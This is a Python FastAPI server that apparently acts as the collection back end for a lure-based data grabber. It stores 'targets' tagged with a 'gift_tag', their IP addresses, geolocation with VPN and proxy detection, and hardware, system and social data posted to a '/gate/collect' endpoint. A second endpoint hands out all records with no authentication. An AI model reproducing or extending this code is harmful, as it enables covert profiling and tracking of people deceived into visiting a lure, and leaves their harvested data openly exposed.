from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import psycopg2
from psycopg2.extras import RealDictCursor
import os, json, requests

app = FastAPI()

DB_URL = os.environ.get("DATABASE_URL")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def setup_db():
    conn = get_db_conn()
    cur = conn.cursor()
    # إنشاء الجدول الأساسي بكل الخانات المطلوبة
    cur.execute("""
        CREATE TABLE IF NOT EXISTS luvra_max_intel (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            geo_data JSONB,
            hardware_data JSONB,
            system_data JSONB,
            social_data JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    # تأكيد وجود عمود gift_tag يدوياً لضمان عدم حدوث Error
    cur.execute("ALTER TABLE luvra_max_intel ADD COLUMN IF NOT EXISTS gift_tag TEXT;")
    conn.commit()
    cur.close()
    conn.close()

@app.post("/api/v1/gate/collect")
async def collect_intel(request: Request):
    client_ip = request.client.host
    try:
        payload = await request.json()
        # سحب بيانات الـ IP مع كشف البروكسي والـ VPN
        geo = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,city,isp,proxy,hosting").json()
        
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO luvra_max_intel 
            (target_id, gift_tag, ip_address, geo_data, hardware_data, system_data, social_data)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        """, (
            payload.get('target_id'),
            payload.get('gift_tag'),
            client_ip,
            json.dumps(geo),
            json.dumps(payload.get('hardware')),
            json.dumps(payload.get('system')),
            json.dumps(payload.get('social_reach'))
        ))
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "SUCCESS"}
    except Exception as e:
        return {"status": "FAIL", "error": str(e)}

@app.get("/api/v1/analytics/full")
async def get_all_data():
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM luvra_max_intel ORDER BY created_at DESC")
    data = cur.fetchall()
    cur.close()
    conn.close()
    return data

@app.get("/health")
def health(): return {"status": "online"}
